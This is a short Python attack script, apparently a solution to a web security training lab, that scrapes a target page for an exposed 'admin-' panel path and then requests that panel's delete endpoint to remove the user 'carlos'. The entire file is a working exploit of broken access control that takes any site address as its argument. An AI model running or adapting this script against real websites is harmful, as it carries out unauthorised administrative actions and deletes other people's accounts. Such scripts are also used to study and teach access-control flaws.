import requests
import sys
import re

def delete_user(url):
    print("(+) Searching for the admin panel...")
    session = requests.Session()
    response = session.get(url)
    html_content = response.text

    pattern = r'admin-\w+'
    matches = re.findall(pattern, html_content)
    if matches:
        admin_panel = matches[-1]
        print(f"(+) Found the admin panel --> {admin_panel}")
        delete_user = url + "/" + admin_panel + "/delete?username=carlos"
        print("(+) Deleting user Carlos...")
        response = session.get(delete_user)
        if response.status_code == 200:
            print("(+) Deleted user Carlos successfully!")
        else:
            print("(-) Something went wrong! Could not delete user Carlos.")  

    else:
        print("(-) Could not find the admin panel")
        print("(-) Exiting...")


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} website")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
    
    else:
        url = sys.argv[1]
        delete_user(url)


if __name__ == "__main__":
    main()
